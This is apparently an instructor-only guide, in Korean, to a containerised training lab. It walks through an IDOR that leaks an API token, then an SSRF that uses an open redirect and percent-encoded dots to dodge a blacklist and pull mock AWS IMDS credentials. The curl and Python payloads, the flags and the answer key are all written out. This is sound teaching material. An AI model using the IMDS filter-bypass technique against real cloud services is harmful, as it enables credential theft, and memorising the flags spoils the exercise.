# Lab2 — ES Customer Portal (Medium / 2 Stages)

> Instructor 전용 문서. 공격 체인·자격증명·flag가 모두 포함되어 있으므로 학생에게 그대로 배포하지 않는다.

## 시나리오

ES 고객 포털에 IDOR 의심 사례가 접수됐다. 포털 내부에는 URL을 서버가 대신 요청해주는 "리포트 임포터" 기능도 있다는 게 확인됐다. 두 가지를 연결해서 어디까지 도달할 수 있는지 점검하라.

- 대상: `<VM_외부_IP>:80`
- 난이도: Medium
- 스테이지: 2개

## 구성

- `portal` (Flask, `es-portal`) — 회원가입/로그인, 문서함 API, 리포트 임포터. 외부 노출(`:80`), `lab2-net` + `internal-net-2` 양쪽에 연결.
- `imds-mock` (Flask, `es-imds-mock`) — 가짜 AWS IMDS. `internal-net-2`(서브넷 `169.254.0.0/16`)에서 고정 IP `169.254.169.254`만 사용, 외부에 전혀 노출되지 않음. 반드시 SSRF를 거쳐야만 도달 가능.
- lab1과 네트워크·자격증명 완전히 분리(`lab2-net`, `internal-net-2`는 lab1의 `lab1-net`과 무관).

## 공격 체인

### Stage 1 — IDOR

1. `/register`로 계정 생성 후 로그인.
2. `/documents`에서 문서 하나를 작성하면 자신의 문서 id가 base64로 노출됨(예: `Mg==`).
3. base64 디코딩 시 단순 정수(`2`)임을 확인 — 순번 규칙 추론.
4. `id=1`(`MQ==`)로 낮춰서 `/api/documents/MQ==` 요청 → 소유자 검증 없이 다른 사용자(`ops_lead`)의 문서 반환.
5. 해당 문서에서 리포트 임포터용 API 토�큰(`es-rep-7f3a9c21`)과 중간 flag 확보.

```bash
curl -s -c c.txt -X POST http://$TARGET/register -d "username=u1&password=p1"
curl -s -b c.txt -X POST http://$TARGET/documents -d "title=t&content=c"
curl -s -b c.txt http://$TARGET/documents            # 내 문서 id(base64) 확인
curl -s -b c.txt http://$TARGET/api/documents/MQ==    # IDOR로 타 사용자 문서 조회
```

### Stage 2 — SSRF → 내부 IMDS (필터 우회 필요)

1. `/api/reports/import`는 `X-Report-Token` 헤더(Stage1에서 확보) 없이는 403.
2. 토큰이 있어도 `url` 값에 `169.254.169.254` 문자열이 그대로 포함되면 서버가 차단(단순 블랙리스트).
3. 포털 자체의 범용 리다이렉터(`/api/reports/_redir?to=...`, 인증 없음)를 이용해 대상 URL을 감싸고, `to` 파라미터 안의 점(`.`)을 `%2E`로 퍼센트 인코딩하면 원본 `url` 문자열에는 `169.254.169.254`가 그대로 나타나지 않아 블랙리스트를 통과한다.
4. 서버가 이 리다이렉터를 요청하면 302로 실제 IMDS 주소로 리다이렉트되고, 서버의 HTTP 클라이언트가 이를 자동으로 따라가(`allow_redirects=True`) 최종적으로 `169.254.169.254`에 도달.
5. `imds-mock`에서 가짜 IAM 자격증명과 최종 flag 획득.

```bash
TOKEN="es-rep-7f3a9c21"
INNER="http://169.254.169.254/latest/meta-data/iam/security-credentials/es-portal-role"
ENCODED_INNER=$(python -c "
import urllib.parse, sys
s = urllib.parse.quote(sys.argv[1], safe='')
s = s.replace('.', '%2E')
print(s)" "$INNER")
PAYLOAD="http://$TARGET/api/reports/_redir?to=$ENCODED_INNER"

curl -s -H "X-Report-Token: $TOKEN" -X POST http://$TARGET/api/reports/import \
  --data-urlencode "url=$PAYLOAD"
```

## 배포 방법

```bash
cd ES_Lab/lab2
docker compose up -d --build
```

## 초기화 방법

```bash
cd ES_Lab/lab2
docker compose down -v
docker compose up -d --build --force-recreate
```

`portal`의 SQLite DB는 컨테이너 내부 `/tmp/portal.db`에 있으며, 컨테이너 재생성 시 초기화되어 seed 데이터(`ops_lead` 문서)가 다시 만들어집니다.

## 정답 확인 (Instructor 전용)

| 항목 | 값 |
|---|---|
| Stage1 결과물 | 리포트 임포터 토큰 `es-rep-7f3a9c21` |
| Stage1 flag(중간) | `esfg{SXMgdGhpcyB0aGUgZW5kPyBLZWVwIHBpdm90aW5nIHRocm91Z2ggdGhlIHJlcG9ydCBpbXBvcnRlci4=}` → 디코딩: `Is this the end? Keep pivoting through the report importer.` |
| Stage2 최종 flag | `esfg{V2VsbCBkb25lISBFUyBQb3J0YWwgTGFiMiBjbGVhci4=}` → 디코딩: `Well done! ES Portal Lab2 clear.` |

## 필요 기술스택

- **Stage1**: 계정 등록/로그인 흐름 분석, 엔드포인트 탐색, base64 인코딩 식별, ID 규칙 추론(IDOR)
- **Stage2**: SSRF 개념, 서버측 화이트/블랙리스트 필터의 한계 이해, 오픈 리다이렉트 체이닝, URL 퍼센트 인코딩을 이용한 필터 우회, AWS IMDS 구조 이해

## 참고

- `imds-mock`은 `internal-net-2`에만 연결되어 외부/다른 랩에서 직접 접근 불가능합니다. 반드시 `portal`의 SSRF를 거쳐야 합니다.
- 이 랩이 실행 중이 아닐 때는 `docker compose down`으로 내려서 포트 80을 비워두세요(lab1 원칙과 동일).
